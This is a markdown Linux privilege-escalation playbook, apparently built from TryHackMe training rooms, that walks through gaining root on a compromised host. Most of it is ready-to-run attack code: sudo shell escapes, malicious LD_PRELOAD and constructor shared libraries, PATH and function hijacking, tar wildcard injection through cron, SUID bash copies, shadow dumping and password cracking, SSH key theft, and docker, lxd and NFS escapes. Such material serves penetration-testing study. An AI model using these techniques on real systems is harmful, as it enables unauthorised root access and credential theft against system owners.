# 🚀 Linux Privilege Escalation Playbook

## The Mindset: "How is this system misconfigured?"

Privilege escalation is about finding **system weaknesses**—not running the right command. Think like a detective, not a robot.

---

## 📋 Initial Connection & Reconnaissance

### 1. Connect to the Target
```bash
ssh user@<target_ip>
# Password: [provided]
```

### 2. Establish Your Baseline
```bash
# Who are you?
id
whoami
groups

# What OS/kernel?
uname -a
cat /etc/os-release

# What's your sudo capability?
sudo -l

# Find SUID/GUID binaries
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -02000 -ls 2>/dev/null

# Find world-writable files
find / -writable -type f 2>/dev/null | head -20
find / -writable -type d 2>/dev/null | head -20

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Check environment variables
env

# What's in your home directory?
ls -la ~/
```

---

## 🧭 The Privilege Escalation Flowchart

```
                    ┌─────────────────────────┐
                    │  Initial Access (low user) │
                    └───────────┬─────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │    Manual Quick Checks   │
                    │  (sudo -l, SUID, cron)   │
                    └───────────┬─────────────┘
                                │
           ┌────────────────────┼────────────────────┐
           │                    │                    │
    ┌──────▼──────┐    ┌───────▼───────┐    ┌─────▼─────┐
    │  Kernel     │    │   Sudo        │    │   SUID/   │
    │  Exploits   │    │   Attacks     │    │  Capab.   │
    └──────┬──────┘    └───────┬───────┘    └─────┬─────┘
           │                    │                    │
    ┌──────▼──────┐    ┌───────▼───────┐    ┌─────▼─────┐
    │  Cron Jobs  │    │  Passwords/   │    │   NFS     │
    │  & Services │    │   Configs     │    │  Shares   │
    └──────┬──────┘    └───────┬───────┘    └───────────┘
           │                    │                    │
           └────────────────────┼────────────────────┘
                                │
                    ┌───────────▼─────────────┐
                    │       ROOT ACCESS       │
                    └─────────────────────────┘
```

---

## 🧨 1. Kernel Exploits

### When to Use
- System is running an older kernel version.
- You have `gcc` or can compile code.

### Detection
```bash
uname -a
cat /proc/version
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

### Common Exploits

| Vulnerability | Kernel Version | CVE | Notes |
|---------------|----------------|-----|-------|
| DirtyCow | 2.6.22 – 4.8.3 | CVE-2016-5195 | Race condition, write to read-only memory |
| OverlayFS | 3.13 – 3.19 | CVE-2015-1328 | Ubuntu privilege escalation |
| PwnKit | All modern | CVE-2021-4034 | pkexec vulnerability |
| DirtyPipe | 5.8 – 5.16 | CVE-2022-0847 | Write to arbitrary files |

### Exploitation Example (DirtyCow)
```bash
# Compile and run
gcc -pthread dirtycow.c -o dirtycow
./dirtycow
# Wait 1-2 minutes
passwd
id  # Should show root
```

### Why It Works
The kernel has a race condition that allows overwriting read-only files. By overwriting `/etc/passwd` or the `passwd` binary, you gain root access.

---

## 🔑 2. Sudo Attacks

### When to Use
- You have sudo permissions (`sudo -l` shows commands).
- `sudo` doesn't require a password for certain commands.

### 2A: Command Injection (sudo -l shows you can run commands)

#### Detection
```bash
sudo -l
```

#### Exploitation Methods

| Command | Exploit |
|---------|---------|
| `find` | `sudo find /bin -name nano -exec /bin/sh \;` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `nmap` | `echo ".execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse` |
| `vim` | `sudo vim -c '!sh'` |
| `vi` | `sudo vi -c '!sh'` |
| `less` | `sudo less /etc/hosts` then `!/bin/sh` |
| `more` | `sudo more /etc/hosts` then `!/bin/sh` |
| `man` | `sudo man man` then `!/bin/sh` |
| `gdb` | `sudo gdb -nx -ex '!sh' -ex quit` |
| `git` | `sudo git -p help config` then `!/bin/sh` |

**Check GTFOBins for full list:** https://gtfobins.github.io/

### 2B: Reading Files (sudo allows reading)

#### Exploitation
```bash
# If you can run apache2
sudo apache2 -f /etc/shadow

# If you can run less/more
sudo less /etc/shadow
sudo more /etc/shadow

# If you can run cat (unlikely but check)
sudo cat /etc/shadow

# Copy the root hash and crack it
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 2C: LD_PRELOAD (env_keep includes LD_PRELOAD)

#### Detection
```bash
sudo -l
# Look for "env_keep" containing LD_PRELOAD
```

#### Exploitation
```bash
# Create malicious shared library
cat > /tmp/x.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/x.so apache2
```

### Why LD_PRELOAD Works
`LD_PRELOAD` loads a shared library before all others. If sudo preserves this environment variable, your library runs with root privileges.

---

## 🧩 3. SUID Binaries

### When to Use
- `find / -perm -4000 -type f` shows interesting binaries.

### Detection
```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

### 3A: Shared Library Injection (.so missing)

#### Detection
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

#### Exploitation
```bash
# Create missing directory
mkdir /home/user/.config

# Create malicious .so
cat > /home/user/.config/libcalc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF

# Compile
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c

# Run SUID binary
/usr/local/bin/suid-so
```

### Why It Works
The SUID binary tries to load a library from a writable directory. You create the library and it runs with root privileges.

### 3B: PATH Hijacking

#### Detection
```bash
strings /usr/local/bin/suid-env
# Look for commands called without full path (e.g., "service" not "/usr/sbin/service")
```

#### Exploitation
```bash
# Create malicious binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service

# Hijack PATH
export PATH=/tmp:$PATH

# Run SUID binary
/usr/local/bin/suid-env
```

### 3C: Function Hijacking

#### Exploitation Method 1 (Function Override)
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

#### Exploitation Method 2 (xtrace/PS4 Injection)
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### 3D: Known SUID Exploits

| Binary | Exploit |
|--------|---------|
| `pkexec` | CVE-2021-4034 (PwnKit) |
| `sudo` | CVE-2019-14287 (sudo -l bypass) |
| `exim` | CVE-2019-10149 (mail server) |
| `screen` | CVE-2017-5618 |
| `vim` | `vim -c ':!sh'` |
| `nano` | `nano` → Ctrl+R → Ctrl+X → `sh` |

---

## 🎯 4. Capabilities

### When to Use
- `getcap -r / 2>/dev/null` shows capabilities on binaries.

### Detection
```bash
getcap -r / 2>/dev/null
```

### Exploitation

| Capability | Exploit |
|------------|---------|
| `cap_setuid` | `python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `cap_setuid` | `perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'` |
| `cap_dac_override` | Can read/write any file |
| `cap_sys_ptrace` | Can debug processes, inject code |

### What Are Capabilities?
Capabilities break down root privileges into individual units. A binary can have specific capabilities without being fully SUID root.

---

## ⏰ 5. Cron Jobs & Scheduled Tasks

### When to Use
- `cat /etc/crontab` shows jobs running as root.

### Detection
```bash
cat /etc/crontab
ls -la /etc/cron*
ls -la /var/spool/cron/
cat /etc/anacrontab
```

### 5A: Writable Cron Script

#### Detection
```bash
# Find which script is run as root
cat /etc/crontab

# Check permissions
ls -l /usr/local/bin/overwrite.sh
```

#### Exploitation
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
# Wait for cron to execute
/tmp/bash -p
```

### 5B: PATH Hijacking in Cron

#### Detection
```bash
cat /etc/crontab
# Look for PATH variable and scripts using relative paths
```

#### Exploitation
```bash
# Create malicious command in a PATH directory
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Wait for cron to execute
/tmp/bash -p
```

### 5C: Wildcard Injection (tar)

#### Detection
```bash
cat /etc/crontab
cat /usr/local/bin/compress.sh
# Look for tar command with * wildcard
```

#### Exploitation
```bash
# Create payload
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh

# Create tar checkpoint files
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh

# Wait for cron to execute
/tmp/bash -p
```

### Why Wildcard Injection Works
`tar` interprets `--checkpoint` and `--checkpoint-action` as command-line options, not files. This executes arbitrary commands with root privileges.

---

## 🔓 6. Password Hunting

### When to Use
- When you have file system access and want to find credentials.

### 6A: Config Files

```bash
# Common locations
cat /etc/openvpn/auth.txt
cat /home/user/.irssi/config | grep -i passw
cat /home/user/.ssh/config
cat /etc/passwd  (world-readable)
cat /etc/shadow  (if readable)
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /home/*/.my.cnf
cat /home/*/.bashrc
cat /home/*/.profile
```

### 6B: History Files

```bash
# Check shell history
cat ~/.bash_history | grep -i passw
cat ~/.zsh_history | grep -i passw
cat ~/.mysql_history
cat ~/.psql_history
cat /home/*/.bash_history
```

### 6C: Cracking /etc/shadow

#### Detection
```bash
ls -la /etc/shadow
# If world-readable (-rw-r--r--), you can steal hashes
```

#### Exploitation
```bash
# Dump passwd and shadow
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt

# Combine them (unshadow)
unshadow passwd.txt shadow.txt > unshadowed.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Or hashcat
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

---

## 🔑 7. SSH Key Discovery

### Detection
```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
find /home -name "*.pem" 2>/dev/null
find /home -name "*.key" 2>/dev/null
```

### Exploitation
```bash
# Copy the key to attacker machine
chmod 400 id_rsa
ssh -i id_rsa root@<target_ip>
```

---

## 🖥️ 8. NFS (no_root_squash)

### When to Use
- `cat /etc/exports` shows `no_root_squash` option.

### Detection
```bash
cat /etc/exports
```

### Exploitation
```bash
# On attacker machine:
showmount -e <target_ip>
mkdir /tmp/mount
mount -o rw,vers=2 <target_ip>:/tmp /tmp/mount

# Create SUID root binary
cat > /tmp/mount/x.c << 'EOF'
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/mount/x.c -o /tmp/mount/x
chmod +s /tmp/mount/x

# On target machine:
/tmp/x
id  # Shows root
```

### Why It Works
`no_root_squash` means remote root users keep their root privileges. Files created as root on the client are owned by root on the server.

---

## 🛠️ 9. Docker Group

### When to Use
- `groups` shows you're in the `docker` group.

### Detection
```bash
groups
```

### Exploitation
```bash
docker run -it -v /:/host alpine chroot /host /bin/bash
```

### Why It Works
The docker group allows you to run containers. By mounting the host's root filesystem, you get root access to the host.

---

## 🧰 10. LXD/LXC Group

### Detection
```bash
groups
```

### Exploitation
```bash
# Build alpine image
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

# Import and run
lxc image import alpine.tar.gz --alias alpine
lxc init alpine root -c security.privileged=true
lxc config device add root disk source=/ path=/mnt/root recursive=true
lxc start root
lxc exec root /bin/sh
```

---

## 📦 Quick Reference Card

| Vector | How to Detect | How to Exploit |
|--------|---------------|----------------|
| Kernel Exploit | `uname -a`, L.E.S. | Compile and run exploit |
| Sudo (command injection) | `sudo -l` | `sudo find -exec /bin/sh \;` |
| Sudo (read files) | `sudo -l` | `sudo apache2 -f /etc/shadow` |
| Sudo (LD_PRELOAD) | `sudo -l` check env_keep | Compile .so, `sudo LD_PRELOAD=...` |
| SUID (.so missing) | `strace suid-binary` | Create missing .so |
| SUID (PATH hijack) | `strings suid-binary` | `export PATH=/tmp:$PATH` |
| SUID (function hijack) | `strings suid-binary` | Override function |
| Capabilities | `getcap -r /` | `python2.6 -c 'os.setuid(0)'` |
| Cron (writable script) | `cat /etc/crontab` | Append reverse shell |
| Cron (PATH hijack) | `cat /etc/crontab` | Create malicious command |
| Cron (wildcard) | `cat /usr/local/bin/*` | `--checkpoint-action=exec` |
| Password hunting | `grep -i passw` configs | Crack with John |
| SSH Keys | `find / -name id_rsa` | `ssh -i id_rsa root@ip` |
| NFS no_root_squash | `cat /etc/exports` | Mount, create SUID binary |
| Docker group | `groups` | `docker run -v /:/host ...` |

---

## 🧠 The "Golden Rule" Checklist (Memorize This)

1. **`sudo -l`** → if anything, check GTFOBins
2. **`find / -perm -4000`** → check SUID binaries
3. **`cat /etc/crontab`** → find writable scripts or wildcard injection
4. **`uname -a`** → check for kernel exploits
5. **`cat /etc/exports`** → check for no_root_squash
6. **`getcap -r /`** → check capabilities
7. **`groups`** → check for docker/lxd
8. **`find / -name id_rsa`** → check for SSH keys
9. **`grep -i passw *`** → hunt for passwords
10. **`linpeas.sh`** → run the full automation

---

## 🔄 When to Use Automation

### LinPEAS (Linux Privilege Escalation Awesome Script)
```bash
# Download and run
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LSE (Linux Smart Enumeration)
```bash
# More organized output than LinPEAS
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh
```

### Linux Exploit Suggester
```bash
# Check for kernel exploits
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 💡 Common Mistakes to Avoid

| Mistake | What to Do Instead |
|---------|-------------------|
| Running only LinPEAS | Do manual checks first, then run automation |
| Ignoring false positives | Cross-check findings manually |
| Not documenting steps | Write down what worked for future reference |
| Trying everything at once | One vector at a time—be systematic |
| Giving up too quickly | Some exploits take time (DirtyCow takes 1-2 minutes) |
| Not checking PATH permissions | A writable PATH directory can lead to privesc |
| Forgetting to check `.bash_history` | This often contains passwords |

---

*This playbook was built from TryHackMe's Linux Strength Training & Linux PrivEsc Arena rooms. Practice on these machines to build muscle memory.*